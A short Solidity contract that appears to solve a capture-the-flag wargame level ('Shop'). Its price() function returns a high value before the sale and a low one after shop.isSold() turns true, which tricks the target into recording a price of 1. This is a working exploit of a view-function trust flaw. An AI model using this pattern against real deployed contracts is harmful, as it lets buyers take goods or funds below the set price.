// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Shop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract Buyer {
    
    Shop shop = Shop(0x29379E7d9e05312291ec07F492C8567815E29Ff8);

    function price() public view returns (uint){
        return (shop.isSold() ? 1 : 100);
    }

    function buy() public {
        shop.buy();
    }
}
